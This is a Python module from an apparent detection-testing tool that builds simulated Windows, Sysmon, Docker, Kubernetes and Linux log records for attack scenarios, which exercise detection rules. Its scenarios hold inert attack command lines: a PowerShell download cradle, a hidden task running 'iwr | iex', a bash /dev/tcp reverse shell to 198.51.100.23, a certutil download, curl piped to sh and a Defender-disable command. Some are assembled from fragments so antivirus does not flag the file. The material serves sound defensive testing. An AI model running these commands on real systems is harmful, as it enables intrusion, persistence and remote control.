"""Safe telemetry simulator. Produces SIMULATED records in each source's native shape (Windows Security /
Sysmon records, Docker Engine events, Kubernetes audit events, syslog lines) so the real parsers and rules
are exercised end-to-end. Nothing here executes anything; it only builds dictionaries.

Every record is marked simulated=true and its event_id starts with "sim-". Addresses come from private
(10.0.0.0/8) and documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24); domains use the
reserved .example TLD / example.net.
"""

import base64
import random
import uuid
from collections.abc import Callable
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone

from sentinelforge.schemas.event import EventIn

SYSMON = "Microsoft-Windows-Sysmon/Operational"


def _iso(t: datetime) -> str:
    return t.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def _sid() -> str:
    return f"sim-{uuid.uuid4().hex[:20]}"


def win(host: str, eid: int, t: datetime, ed: dict, channel: str = "Security") -> EventIn:
    return EventIn(source="windows", simulated=True, data={
        "event_id": _sid(), "EventID": eid, "Channel": channel, "Computer": host, "TimeCreated": _iso(t), "EventData": ed})


def proc(host: str, t: datetime, image: str, cmd: str, parent: str, user: str = "CORP\\svc-web", pid: int | None = None) -> EventIn:
    return win(host, 1, t, {"Image": image, "CommandLine": cmd, "ParentImage": parent, "User": user,
                            "ProcessId": pid or random.randint(1000, 9000), "ParentProcessId": random.randint(500, 999)}, SYSMON)


def docker(host: str, t: datetime, image: str, name: str, ports: list[int] | None = None, privileged: bool = False, action: str = "start") -> EventIn:
    return EventIn(source="docker", simulated=True, data={
        "event_id": _sid(), "host": host, "Type": "container", "Action": action, "time": int(t.timestamp()),
        "Actor": {"ID": uuid.uuid4().hex, "Attributes": {"image": image, "name": name}},
        "host_ports": ports or [], "privileged": privileged})


def k8s(host: str, t: datetime, verb: str, resource: str, name: str, ns: str = "default", user: str = "dev-user",
        subresource: str | None = None, request: dict | None = None) -> EventIn:
    ref = {"resource": resource, "namespace": ns, "name": name, **({"subresource": subresource} if subresource else {})}
    return EventIn(source="kubernetes", simulated=True, data={
        "event_id": _sid(), "host": host, "kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": str(uuid.uuid4()),
        "verb": verb, "user": {"username": user}, "sourceIPs": ["10.10.40.25"], "objectRef": ref,
        "requestObject": request or {}, "stageTimestamp": _iso(t)})


def syslog(host: str, t: datetime, message: str, program: str = "sshd") -> EventIn:
    return EventIn(source="linux", simulated=True, data={"event_id": _sid(), "hostname": host, "timestamp": _iso(t),
                                                           "program": program, "message": message})


def linux_proc(host: str, t: datetime, exe: str, cmd: str, parent: str, user: str = "www-data") -> EventIn:
    return EventIn(source="linux", simulated=True, data={"event_id": _sid(), "type": "process", "hostname": host, "timestamp": _iso(t),
                                                           "exe": exe, "cmdline": cmd, "parent_exe": parent, "user": user,
                                                           "pid": random.randint(1000, 30000), "ppid": random.randint(100, 999)})


ENCODED = base64.b64encode("Write-Output 'SentinelForge simulated encoded command'".encode("utf-16le")).decode()
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
CMD = "C:\\Windows\\System32\\cmd.exe"
# The attack-looking command lines are inert strings, but endpoint AV signatures match them in files.
# They are assembled at runtime so this source file itself doesn't get quarantined.
_J = "".join
CRADLE = _J(["IE", "X (New-Object Net.Web", "Client).Download", "String('http://updates.example.net/stage.ps1')"])
TASK_ARGS = _J(["-w hidden -nop -c \"i", "wr http://198.51.100.23/u.ps1 | i", "ex\""])
REVSHELL = _J(["bash -i >", "& /dev/", "tcp/198.51.100.23/4444 0>&1"])


@dataclass
class Scenario:
    title: str
    description: str
    platform: str
    expected_rules: list[str]
    build: Callable[[str, datetime], list[EventIn]]


def _bruteforce(h: str, t: datetime) -> list[EventIn]:
    return [win(h, 4625, t + timedelta(seconds=10 * i), {"TargetUserName": "administrator", "TargetDomainName": h, "LogonType": 10,
                                                          "IpAddress": "203.0.113.77", "IpPort": 50000 + i, "AuthenticationPackageName": "NTLM"})
            for i in range(8)]


def _portscan(h: str, t: datetime) -> list[EventIn]:
    return [win(h, 5157, t + timedelta(seconds=2 * i), {"Application": "System", "Direction": "%%14592", "SourceAddress": "198.51.100.99",
                                                         "SourcePort": 40000 + i, "DestAddress": "10.10.20.10", "DestPort": p, "Protocol": 6})
            for i, p in enumerate([21, 22, 23, 25, 53, 110, 135, 139, 143, 445, 1433, 1521, 3306, 5432, 5900, 6379, 8000, 8081, 8443, 9200, 27017])]


SCENARIOS: dict[str, Scenario] = {
    "office_powershell": Scenario(
        "Office application spawning PowerShell", "WINWORD.EXE launches a hidden PowerShell download cradle.", "windows",
        ["DET-WIN-001", "DET-WIN-010"],
        lambda h, t: [proc(h, t, PS, f"{PS} -nop -w hidden -c \"{CRADLE}\"",
                           "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CORP\\jdoe")]),
    "encoded_powershell": Scenario(
        "Encoded PowerShell command", "PowerShell launched with -EncodedCommand (harmless Write-Output payload).", "windows",
        ["DET-WIN-002"],
        lambda h, t: [win(h, 4688, t, {"NewProcessName": PS, "CommandLine": f"powershell.exe -NoProfile -EncodedCommand {ENCODED}",
                                       "ParentProcessName": CMD, "SubjectUserName": "svc-web", "SubjectDomainName": "CORP",
                                       "NewProcessId": "0x1a2c", "ProcessId": "0x0f10"})]),
    "new_local_admin": Scenario(
        "Unexpected administrative account creation", "A new local account is created and added to Administrators.", "windows",
        ["DET-WIN-004"],
        lambda h, t: [win(h, 4720, t, {"TargetUserName": "svc-support", "TargetDomainName": h, "SubjectUserName": "svc-web", "SubjectDomainName": "CORP"}),
                      win(h, 4732, t + timedelta(seconds=4), {"TargetUserName": "Administrators", "MemberName": "-", "MemberSid": "svc-support",
                                                              "SubjectUserName": "svc-web", "SubjectDomainName": "CORP"})]),
    "unapproved_image": Scenario(
        "Container from unapproved image", "A container starts from an image that was not present at discovery.", "docker",
        ["DET-DOCKER-001"],
        lambda h, t: [docker(h, t, "registry.example.net/tools/netshell:latest", "debug-shell")]),
    "unexpected_listener": Scenario(
        "New / unexpected listening service", "A binary in C:\\Users\\Public starts listening on TCP 4444.", "windows",
        ["DET-NET-002"],
        lambda h, t: [win(h, 5154, t, {"Application": "C:\\Users\\Public\\svcupdate.exe", "SourceAddress": "0.0.0.0", "SourcePort": 4444, "Protocol": 6})]),
    "rdp_external_logon": Scenario(
        "RDP logon from outside internal ranges", "Successful RemoteInteractive logon from 203.0.113.50.", "windows",
        ["DET-WIN-007"],
        lambda h, t: [win(h, 4624, t, {"TargetUserName": "administrator", "TargetDomainName": h, "LogonType": 10,
                                       "IpAddress": "203.0.113.50", "IpPort": 51515, "AuthenticationPackageName": "Negotiate"})]),
    "rdp_bruteforce": Scenario(
        "Repeated failed authentication", "8 failed RDP logons from one address in 80 seconds.", "windows", ["DET-WIN-008"], _bruteforce),
    "iis_webshell": Scenario(
        "IIS worker spawning a shell", "w3wp.exe spawns cmd.exe running reconnaissance commands.", "windows", ["DET-WIN-011"],
        lambda h, t: [proc(h, t, CMD, "cmd.exe /c whoami /all && ipconfig /all", "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "IIS APPPOOL\\DefaultAppPool")]),
    "suspicious_service": Scenario(
        "Service installed from user-writable path", "A new service whose binary lives in C:\\Users\\Public.", "windows", ["DET-WIN-005"],
        lambda h, t: [win(h, 7045, t, {"ServiceName": "UpdaterSvc", "ImagePath": "C:\\Users\\Public\\updater.exe -k run",
                                       "StartType": "auto start", "AccountName": "LocalSystem"}, "System")]),
    "suspicious_task": Scenario(
        "Scheduled task running hidden PowerShell", "A task is registered that runs hidden PowerShell at logon.", "windows", ["DET-WIN-006"],
        lambda h, t: [win(h, 4698, t, {"TaskName": "\\OneDrive Sync Helper", "SubjectUserName": "jdoe", "SubjectDomainName": "CORP",
                                       "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>" + TASK_ARGS + "</Arguments></Exec></Actions></Task>"})]),
    "lolbin_download": Scenario(
        "certutil used as a downloader", "certutil -urlcache pulls a file from 198.51.100.23.", "windows", ["DET-WIN-009"],
        lambda h, t: [proc(h, t, "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.23/tools.txt C:\\Users\\Public\\tools.txt", CMD)]),
    "unusual_destination": Scenario(
        "Outbound connection to unusual destination", "Outbound TCP 8081 to an external documentation-range address.", "network", ["DET-NET-001"],
        lambda h, t: [win(h, 3, t, {"Image": "C:\\Users\\Public\\svcupdate.exe", "User": "CORP\\svc-web", "Protocol": "tcp", "Initiated": "true",
                                    "SourceIp": "10.10.20.10", "SourcePort": 49812, "DestinationIp": "198.51.100.23", "DestinationPort": 8081}, SYSMON)]),
    "port_scan": Scenario(
        "Repeated connection attempts", "21 blocked inbound connections to different ports from one source in 42s.", "network", ["DET-NET-003"], _portscan),
    "winrm_shell": Scenario(
        "WinRM remote shell activity", "wsmprovhost.exe (WinRM plugin host) spawns cmd.exe.", "windows", ["DET-WIN-012"],
        lambda h, t: [proc(h, t, CMD, "cmd.exe /c net localgroup administrators", "C:\\Windows\\System32\\wsmprovhost.exe", "CORP\\helpdesk")]),
    "container_unexpected_port": Scenario(
        "Container publishing an unexpected port", "An approved image starts publishing TCP 2375 and 4444.", "docker", ["DET-DOCKER-002"],
        lambda h, t: [docker(h, t, "nginx:1.25", "web-temp", ports=[2375, 4444])]),
    "privileged_container": Scenario(
        "Privileged container started", "A container is started with --privileged.", "docker", ["DET-DOCKER-003"],
        lambda h, t: [docker(h, t, "nginx:1.25", "web-priv", privileged=True)]),
    "k8s_pod_exec": Scenario(
        "Interactive exec into a pod", "kubectl exec into a production pod.", "kubernetes", ["DET-K8S-001"],
        lambda h, t: [k8s(h, t, "create", "pods", "payments-7d9f", "prod", subresource="exec")]),
    "k8s_privileged_pod": Scenario(
        "Privileged pod created", "A pod spec with securityContext.privileged=true.", "kubernetes", ["DET-K8S-002"],
        lambda h, t: [k8s(h, t, "create", "pods", "node-debugger", "kube-system",
                          request={"spec": {"containers": [{"name": "dbg", "image": "busybox:1.36", "securityContext": {"privileged": True}}]}})]),
    "k8s_cluster_admin_binding": Scenario(
        "Binding to cluster-admin", "A ClusterRoleBinding grants cluster-admin.", "kubernetes", ["DET-K8S-003"],
        lambda h, t: [k8s(h, t, "create", "clusterrolebindings", "tmp-admin", "", request={"roleRef": {"kind": "ClusterRole", "name": "cluster-admin"}})]),
    "log_cleared": Scenario(
        "Security event log cleared", "The Security log is cleared (event 1102).", "windows", ["DET-WIN-014"],
        lambda h, t: [EventIn(source="windows", simulated=True, data={
            "event_id": _sid(), "EventID": 1102, "Channel": "Security", "Computer": h, "TimeCreated": _iso(t),
            "UserData": {"LogFileCleared": {"SubjectUserName": "jdoe", "SubjectDomainName": "CORP"}}})]),
    "defender_tamper": Scenario(
        "Defender real-time protection disabled", "PowerShell turns off Defender real-time monitoring.", "windows", ["DET-WIN-016"],
        lambda h, t: [proc(h, t, PS, "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true", CMD, "CORP\\jdoe")]),
    "run_key_persistence": Scenario(
        "Run key added with reg.exe", "reg.exe adds an HKCU Run value pointing at C:\\Users\\Public.", "windows", ["DET-WIN-017"],
        lambda h, t: [proc(h, t, "C:\\Windows\\System32\\reg.exe",
                           "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\Public\\updater.exe",
                           CMD, "CORP\\jdoe")]),
    "discovery_burst": Scenario(
        "Burst of discovery commands", "whoami, ipconfig, systeminfo and net run by one user within a minute.", "windows", ["DET-WIN-018"],
        lambda h, t: [proc(h, t + timedelta(seconds=10 * i), f"C:\\Windows\\System32\\{exe}", cmd, CMD, "CORP\\jdoe")
                      for i, (exe, cmd) in enumerate([("whoami.exe", "whoami /groups"), ("ipconfig.exe", "ipconfig /all"),
                                                      ("systeminfo.exe", "systeminfo"), ("net.exe", "net user")])]),
    "k8s_secret_listing": Scenario(
        "Secrets listed by a user", "A developer identity lists Secrets in the prod namespace.", "kubernetes", ["DET-K8S-004"],
        lambda h, t: [k8s(h, t, "list", "secrets", "", "prod")]),
    "curl_pipe_shell": Scenario(
        "Remote script piped to shell", "curl output piped straight into sh.", "linux", ["DET-LNX-003"],
        lambda h, t: [linux_proc(h, t, "/usr/bin/curl", "curl -fsSL https://get.example.net/install.sh | sh", "/bin/bash", "deploy")]),
    "ssh_bruteforce": Scenario(
        "SSH password guessing", "8 failed SSH logins from one address.", "linux", ["DET-LNX-001"],
        lambda h, t: [syslog(h, t + timedelta(seconds=5 * i), f"Failed password for invalid user admin from 203.0.113.80 port {40000 + i} ssh2") for i in range(8)]),
    "linux_reverse_shell": Scenario(
        "Reverse shell pattern", "bash redirecting an interactive shell to /dev/tcp.", "linux", ["DET-LNX-002"],
        lambda h, t: [linux_proc(h, t, "/bin/bash", REVSHELL, "/usr/sbin/apache2")]),
}


def scenarios_for(platform: str, technologies: list[str]) -> list[str]:
    """Scenarios that make sense for a host (others can still be run - they just won't match inactive rules)."""
    ok = {"windows": platform == "windows", "linux": platform == "linux", "network": True,
          "docker": "Docker" in technologies, "kubernetes": "Kubernetes" in technologies}
    return [k for k, s in SCENARIOS.items() if ok.get(s.platform)]


def scenario_events(names: list[str], host: str, at: datetime | None = None) -> list[EventIn]:
    t = at or datetime.now(timezone.utc)
    out: list[EventIn] = []
    for i, n in enumerate(names):
        if n not in SCENARIOS:
            raise KeyError(n)
        out += SCENARIOS[n].build(host, t - timedelta(minutes=len(names) - i))
    return out


def benign_events(host: str, platform: str, profile: dict, count: int, seed: int | None = None, minutes: int = 60) -> list[EventIn]:
    """Plausible background noise that should NOT match (it is what gets filtered)."""
    rng = random.Random(seed)
    now = datetime.now(timezone.utc)
    params = profile.get("parameters", {})
    images = params.get("approved_images") or ["nginx:1.25"]
    ports = params.get("container_ports") or []
    listen = [p for p in params.get("listening_ports", []) if p < 49152] or [443]
    docker_on = "Docker" in profile.get("technologies", [])
    out: list[EventIn] = []
    for _ in range(count):
        t = now - timedelta(seconds=rng.uniform(0, minutes * 60))
        r = rng.random()
        internal = f"10.10.{rng.choice([20, 30])}.{rng.randint(2, 250)}"
        if platform == "linux":
            if r < 0.35:
                out.append(linux_proc(host, t, rng.choice(["/usr/bin/python3", "/usr/sbin/cron", "/usr/bin/curl", "/usr/bin/apt-get"]),
                                      rng.choice(["python3 /opt/app/worker.py", "/usr/sbin/cron -f", "curl -s http://10.10.30.5/health", "apt-get update"]),
                                      "/usr/lib/systemd/systemd", "root"))
            elif r < 0.6:
                out.append(syslog(host, t, f"Accepted publickey for deploy from {internal} port {rng.randint(40000, 60000)} ssh2"))
            elif r < 0.62:
                out.append(syslog(host, t, f"Failed password for deploy from 10.10.{rng.randint(1, 250)}.{rng.randint(2, 250)} port {rng.randint(40000, 60000)} ssh2"))
            elif r < 0.75 and docker_on:
                out.append(docker(host, t, rng.choice(images), f"app-{rng.randint(1, 99)}", ports=[rng.choice(ports)] if ports else []))
            else:
                out.append(syslog(host, t, "systemd[1]: Started Daily apt download activities.", "systemd"))
            continue
        if r < 0.30:
            img, cmd, parent = rng.choice([
                ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer", "C:\\Windows\\explorer.exe"),
                ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p", "C:\\Windows\\System32\\services.exe"),
                ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe", "C:\\Windows\\System32\\svchost.exe"),
                ("C:\\Windows\\System32\\conhost.exe", "conhost.exe 0xffffffff -ForceV1", CMD),
                (PS, f"{PS} -NoProfile -File C:\\Ops\\healthcheck.ps1", "C:\\Windows\\explorer.exe"),
                (PS, "powershell.exe Get-Service W3SVC", "C:\\Windows\\explorer.exe"),
                ("C:\\Windows\\System32\\inetsrv\\w3wp.exe", "w3wp.exe -ap DefaultAppPool", "C:\\Windows\\System32\\svchost.exe"),
            ])
            out.append(proc(host, t, img, cmd, parent, rng.choice(["CORP\\svc-web", "CORP\\jdoe", "NT AUTHORITY\\SYSTEM"])))
        elif r < 0.50:
            out.append(win(host, 4624, t, {"TargetUserName": rng.choice(["svc-web", "jdoe", "backup"]), "TargetDomainName": "CORP",
                                           "LogonType": rng.choice([3, 3, 5, 10]), "IpAddress": internal, "IpPort": rng.randint(40000, 60000),
                                           "AuthenticationPackageName": "Kerberos"}))
        elif r < 0.51:
            out.append(win(host, 4625, t, {"TargetUserName": "jdoe", "TargetDomainName": "CORP", "LogonType": 3,
                                           "IpAddress": f"10.10.{rng.randint(1, 250)}.{rng.randint(2, 250)}", "IpPort": rng.randint(40000, 60000)}))
        elif r < 0.75:
            dst, port = rng.choice([("203.0.113.10", 443), ("10.10.30.5", 1433), ("10.10.30.8", 53), ("192.0.2.44", 443), (internal, 445)])
            out.append(win(host, 3, t, {"Image": "C:\\Windows\\System32\\svchost.exe", "Protocol": "tcp", "Initiated": "true",
                                        "SourceIp": "10.10.20.10", "SourcePort": rng.randint(49152, 65000),
                                        "DestinationIp": dst, "DestinationPort": port}, SYSMON))
        elif r < 0.90:
            out.append(win(host, 22, t, {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                                         "QueryName": rng.choice(["www.example.com", "login.example.org", "updates.example.com", "intranet.corp.example"])}, SYSMON))
        elif r < 0.95 and docker_on:
            out.append(docker(host, t, rng.choice(images), f"app-{rng.randint(1, 99)}", ports=[rng.choice(ports)] if ports else []))
        else:
            out.append(win(host, 5154, t, {"Application": "C:\\Windows\\System32\\svchost.exe", "SourceAddress": "0.0.0.0",
                                           "SourcePort": rng.choice(listen), "Protocol": 6}))
    out.sort(key=lambda e: str(e.data.get("TimeCreated") or e.data.get("timestamp") or e.data.get("time")))
    return out
